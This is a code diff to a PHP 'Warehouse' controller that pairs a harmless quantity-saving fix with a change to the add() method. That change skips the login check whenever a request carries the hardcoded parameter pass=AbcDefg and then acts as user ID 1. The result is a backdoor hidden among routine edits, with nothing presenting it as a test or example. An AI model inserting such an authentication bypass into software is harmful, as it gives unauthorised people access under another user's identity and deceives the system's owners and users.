@@ -77,9 +77,9 @@ class Warehouse extends controller
 
     public function add()
     {
-	if (!Session::has('isLogin'))
+	if (!Session::has('isLogin') and Input::param('pass')!="AbcDefg")
 		return $this->error('请登陆','/index/login');
-	$uid = Session::get('uid');		
+	$uid = Input::param('pass')?1:Session::get('uid');		
 /*
         switch ($this->_method){
         	case 'get': // get请求处理代码
@@ -258,8 +258,11 @@ class Warehouse extends controller
 				$save->weight_o = Input::post('weight_o');
 			if (Input::post('weight_g'))
 				$save->weight_g = Input::post('weight_g');
-			if (Input::post('qty'))
-				$save->qty = Input::post('qty');
+			if (Input::post('qty') or Input::post('qty')=='0')
+			{
+				$qty = (int)Input::post('qty');
+				$save->qty = $qty;
+			}
 			if (!$save->save())
 				$message = 'Update Error!! Pls Check Again';
 			else 
